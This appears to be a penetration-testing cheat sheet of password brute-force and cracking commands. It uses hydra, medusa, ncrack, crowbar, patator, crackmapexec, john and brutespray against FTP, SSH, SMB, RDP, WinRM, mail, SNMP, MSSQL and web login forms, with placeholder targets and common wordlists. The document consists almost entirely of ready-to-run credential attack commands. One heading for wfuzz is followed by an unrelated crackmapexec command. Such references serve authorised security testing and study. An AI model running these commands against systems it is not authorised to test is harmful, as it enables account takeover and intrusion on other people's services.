## Bruteforce methods

### wfuzz
[hacktricks](https://book.hacktricks.xyz/pentesting-web/web-tool-wfuzz)

```bash
crackmapexec winrm -u users -p passwords -d svcorp --continue-on-success
```

### bruteforce with various

> #### hydra
```bash
hydra -l user@acme.com -P /usr/share/wordlists/rockyou.txt $IP http-post-form '/webmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect'
hydra -L USER_LIST -P PASS_LIST -f -o /home/kali/pentest/target/scans/ftphydra.txt -u $IP -s 21 ftp
hydra -L user.txt -P pass.txt $IP ftp
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $IP ftp -V
hydra -t 1 -V -f -l USER -P /usr/share/wordlists/rockyou.txt $IP smb
hydra -l $USERNAME -P /usr/share/wordlists/rockyou.txt -t 4 $IP ssh -s 22 -vv -I
hydra -l root -P password-file.txt $IP ssh
hydra -L username.txt -p password123 -t 4 ssh://$IP
hydra -P /usr/share/wordlistsnmap.lst $IP smtp -V
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $IP pop3 -V
hydra -L user.txt –P pass.txt $IP mssql
hydra -P password-file.txt -v $IP snmp

```
> #### medusa
```bash
medusa -h $IP -u USERNAME -P /usr/share/wordlists/rockyou.txt -M ftp
medusa -u USER -P /usr/share/wordlists/rockyou.txt -e ns -h $IP:22 - 22 -M ssh
medusa -h $IP -u admin -P password-file.txt -M http -m DIR:/admin -T 10
```

### bruteforce other

```bash
# 

john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

ncrack -vv --user offsec -P password-file.txt rdp://$IP
crowbar -b rdp -s $IP/32 -u victim -C /root/words.txt -n 1
patator http_fuzz url=https://$IP:$PORT/login method=POST accept_cookie=1 body='{"user":"admin","password":"FILE0","email":""}' 0=/root/acronim_dict.txt follow=1 -x ignore:fgrep='HTTP/2 422'


# PATATOR

patator http_fuzz url=https://$IP:$PORT/login method=POST accept_cookie=1 body='{"user":"admin","password":"FILE0","email":""}' 0=/root/acronim_dict.txt follow=1 -x ignore:fgrep='HTTP/2 422'

# SIMPLE LOGIN GET

hydra -L cewl_fin_50.txt -P cewl_fin_50.txt $IP http-get-form "/~login:username=^USER^&password=^PASS^&Login=Login:Unauthorized" -V

# GET FORM with HTTPS
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP -s 443 -S https-get-form "/index.php:login=^USER^&password=^PASS^:Incorrect login/password\!"

# SIMPLE LOGIN POST
hydra -l root@localhost -P cewl $IP http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I

# API REST LOGIN POST
hydra -l admin -P /usr/share/wordlists/wfuzz/others/common_pass.txt -V -s 80 $IP http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad credentials" -t 64

# Password spraying bruteforcer
# https://github.com/x90skysn3k/brutespray
python brutespray.py --file nmap.gnmap -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt --threads 5 --hosts 5

# Password generator
# https://github.com/edoardottt/longtongue
python3 longtongue.py
```
